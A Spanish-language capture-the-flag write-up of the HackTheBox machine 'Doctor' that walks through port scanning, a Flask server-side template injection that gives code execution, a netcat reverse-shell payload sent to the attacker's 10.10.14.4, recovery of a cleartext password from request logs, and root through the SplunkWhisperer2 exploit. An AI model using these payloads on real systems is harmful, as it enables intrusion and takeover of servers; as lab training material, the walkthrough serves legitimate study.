# Máquina "Doctor" de HackTheBox

## Características

- Linux
- Easy
- External
- Splunk
- Penetration Tester Level 1
- SSTI Exploitation
- A03:2021-Injection
- Enumeration
- Remote Code Execution
- Defense Mechanisms
- Clear Text Credentials
- SIEM
- Log Analysis
- Misconfiguration
- SSTI
- SSTI popen (RCE)
- Bypassing de command injection (RCE)
- Abusing ADM group finding credentials in request logs
- Splunk exploitation en la escalada

## Útil en

- eWPT
- eWPTX v2
- OSWE

**IP:** 10.10.10.209

## Escaneo de puertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.209 -oG allPorts
```

```bash
sudo nmap -sCV -p22,80,8089 10.10.10.209 -oN targeted
```

### Resultado del escaneo

```
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Reconocimiento web

Vemos el puerto 80 y 8089, así que les lanzamos un whatweb:

```bash
whatweb http://10.10.10.209
```

**Resultado:**
```
http://10.10.10.209 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@doctors.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.209], JQuery[3.3.1], Script, Title[Doctor]
```

```bash
whatweb http://10.10.10.209:8089
```

**Resultado:**
```
ERROR Opening: http://10.10.10.209:8089 - Connection reset by peer
```

Como vemos en la descripción de nmap del puerto 8089, nos muestra SSL y no HTTP, así que enviaremos HTTPS:

```bash
whatweb https://10.10.10.209:8089
```

**Resultado:**
```
https://10.10.10.209:8089 [200 OK] Country[RESERVED][ZZ], HTTPServer[Splunkd], IP[10.10.10.209], Title[splunkd], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN]
```

## Configuración del archivo hosts

Agregamos al archivo `/etc/hosts`. Así que podemos tener un dominio en el puerto 80, podemos hacer virtual hosting. Ingresamos los datos de 3 formas: una con la IP, otra con el dominio y la otra con la IP al puerto 8089:

```bash
echo "10.10.10.209 doctors.htb doctor.htb" >> /etc/hosts
```

![Página web principal](/secciones/posts/imagenes/doctor/web1.png)

## Investigación de Splunk

Vemos los 4 links y nada. Continuamos lanzando `searchsploit splunk`. Luego buscamos en Google y podemos ver un local privilege escalation en:

https://github.com/cnotin/SplunkWhisperer2

Nos pide usuario y clave, así que lo dejaremos guardado.

## Análisis de la aplicación web

Volvemos a la página principal, nos registramos y vemos un panel con un número:

```
http://doctors.htb/home?page=1
```

Que podemos modificarlo para testear:

```
http://doctors.htb/home?page=../../../../.././../etc/passwd
```

Veremos el código fuente y podemos ver que hay una referencia a un directorio `<a class="nav-item nav-link" href="/home">Home</a>` y no se ve nada, así que agregamos al `/etc/hosts`.

```bash
whatweb http://doctors.htb
```

**Resultado:**
```
http://doctors.htb [302 Found] Cookies[session], Country[RESERVED][ZZ], HTTPServer[Werkzeug/1.0.1 Python/3.8.2], HttpOnly[session], IP[10.10.10.209], Python[3.8.2], RedirectLocation[http://doctors.htb/login?next=%2F], Title[Redirecting...], Werkzeug[1.0.1]
http://doctors.htb/login?next=%2F [200 OK] Bootstrap[4.0.0], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/1.0.1 Python/3.8.2], IP[10.10.10.209], JQuery, PasswordField[password], Python[3.8.2], Script, Title[Doctor Secure Messaging - Login], Werkzeug[1.0.1]
```

## Explotación SSTI

Ahora sí podemos ver, y al ver con Wappalyzer nos muestra que corre Flask. Lanzamos esta payload:

```python
{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}  
```

![SSTI Payload](/secciones/posts/imagenes/doctor/payload.webp)

¡Tenemos RCE! Ahora, probé una línea de shell reverso de la hoja de trucos de shell reverso de PentestMonkey. Esta fue mi carga útil final:

```python
 {request.application.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 1234 >/tmp/f').read()} 
```

## Acceso inicial

Configuramos netcat y lanzamos:

```bash
nc -lvnp 1234
```

Tenemos shell, la configuramos y seguimos.

A continuación, utilicé `ssh-keygen` para crear un `id_rsa` para la web y luego inicié sesión a través de SSH.

## Escalada horizontal

Una vez dentro, lanzamos `id` y podemos ver que tenemos el grupo `adm`. Una búsqueda rápida me dijo que los usuarios del grupo `adm` pueden leer los archivos `/var/log`.

Así que vamos y ejecutamos:

```bash
grep -ir password * 2>/dev/null
```

Es posible que hayamos encontrado una posible contraseña: `Guitar123`. Intentamos ingresar con el usuario `shaun` y entramos con éxito.

Sacamos la flag de user.

## Escalamiento de privilegios

Ejecuté `ps aux` y vi que root está ejecutando el servidor splunkd:

```bash
ps aux | grep splunk
```

Usaremos el exploit nuevamente, pero esta vez desde shaun:

```bash
python3 PySplunkWhisperer2_remote.py --host doctor.htb --port 8089 --username shaun --password Guitar123 --payload "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 1234 >/tmp/f" --lhost 10.10.14.4
```

¡Y somos root!

## Nota  

Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes. Esto se debe a que en algunas de las máquinas que realicé, no tomé los apuntes o no tomé capturas de pantalla, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. También, si encuentras faltas de ortografía o cualquier error, puedes contactarme a mi correo.

